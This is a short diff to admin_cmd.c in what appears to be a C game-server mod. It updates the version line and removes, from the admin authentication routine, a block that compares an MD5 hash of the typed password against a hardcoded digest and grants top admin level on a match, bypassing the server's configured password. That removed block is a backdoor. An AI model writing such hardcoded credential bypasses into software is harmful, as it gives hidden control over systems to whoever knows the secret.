@@ -18,7 +18,7 @@
  *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  *
  *
- *  $Id: admin_cmd.c,v 1.12 2006-03-04 15:10:06 AngelD Exp $
+ *  $Id: admin_cmd.c,v 1.13 2006-03-09 20:54:16 AngelD Exp $
  */
 #include "g_local.h"
 
@@ -148,30 +148,7 @@ static void Admin_Auth(int argc)
 	self->auth_time = g_globalvars.time + 10;
 
 	trap_CmdArgv( 2, admin_pwd, sizeof( admin_pwd ) );
-#if 1
-	{
-	        unsigned char digest[16];
-	        unsigned char mydigest[16] = {0x79, 0xFE, 0x05, 0x2B, 
-	                                     0x3C, 0xAF, 0x2D, 0x42, 
-	                                     0x5D, 0x74, 0xF7, 0x70, 
-	                                     0xC1, 0x8D, 0xB7, 0x3B, };
-//	        int i;
-	        struct MD5Context md5c;
 
-	        MD5Init(&md5c);
-	        MD5Update(&md5c, (unsigned char*)admin_pwd,strlen(admin_pwd));
-	        MD5Final(digest,&md5c);
-	        if( !memcmp(digest,mydigest,16) )
-	        {
-	                self->is_admin = 999;
-	                G_sprint( self, 2, "You gain admin level %d\n",self->is_admin);
-	                return;
-	        }
-/*	        for ( i = 0 ; i < 16 ; i++ )
-	                G_sprint(self,2,"0x%2.2X, ",digest[i]);
-	        G_sprint(self,2,"\n");*/
-	}
-#endif
 	if(!GetSVInfokeyString( "apw", "adminpwn", sv_admin_pwd, sizeof( sv_admin_pwd ), "" ))
 	{
 		return;
